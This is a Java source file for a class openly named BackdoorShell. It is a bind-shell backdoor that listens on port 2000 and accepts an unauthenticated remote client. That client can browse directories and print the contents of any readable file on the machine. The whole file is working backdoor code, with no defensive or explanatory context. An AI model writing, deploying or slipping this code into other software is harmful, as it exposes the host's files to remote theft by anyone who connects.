import java.io.*;
import java.net.*;

public class BackdoorShell {

    private static final int PORT = 2000;

    public static void main(String[] args) throws IOException {
        ServerSocket serverSocket = new ServerSocket(PORT);
        System.out.println("Server is listening on port " + PORT);

        Socket socket = serverSocket.accept();
        System.out.println("Client connected");

        BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        PrintWriter writer = new PrintWriter(socket.getOutputStream(), true);

        String currentDirectory = System.getProperty("user.dir");
        String osName = System.getProperty("os.name").toLowerCase();
        String prompt = osName.contains("windows") ? "C:\\>" : "/User/username>";

        while (true) {
            writer.print(currentDirectory + prompt);
            writer.flush();

            String command = reader.readLine();
            if (command == null || command.trim().isEmpty()) {
                continue;
            }

            String[] tokens = command.split("\\s+");
            String cmd = tokens[0].toLowerCase();

            switch (cmd) {
                case "cd":
                    if (tokens.length > 1) {
                        File newDirectory = new File(currentDirectory, tokens[1]);
                        if (newDirectory.exists() && newDirectory.isDirectory()) {
                            currentDirectory = newDirectory.getCanonicalPath();
                        } else {
                            writer.println("Directory not found!");
                        }
                    } else {
                        writer.println("Usage: cd <directory>");
                    }
                    break;
                case "dir":
                    writer.println("List of files in " + currentDirectory);
                    File[] files = new File(currentDirectory).listFiles();
                    if (files != null) {
                        for (File file : files) {
                            String type = file.isDirectory() ? "Directory" : "File";
                            writer.println(file.getName() + " - " + type);
                        }
                    }
                    break;
                case "cat":
                    if (tokens.length > 1) {
                        File fileToRead = new File(currentDirectory, tokens[1]);
                        if (fileToRead.exists() && fileToRead.isFile()) {
                            BufferedReader fileReader = new BufferedReader(new FileReader(fileToRead));
                            String line;
                            while ((line = fileReader.readLine()) != null) {
                                writer.println(line);
                            }
                            fileReader.close();
                        } else {
                            writer.println("File not found!");
                        }
                    } else {
                        writer.println("Usage: cat <filename>");
                    }
                    break;
                default:
                    writer.println("Unsupported command: " + cmd);
                    break;
            }
        }
    }
}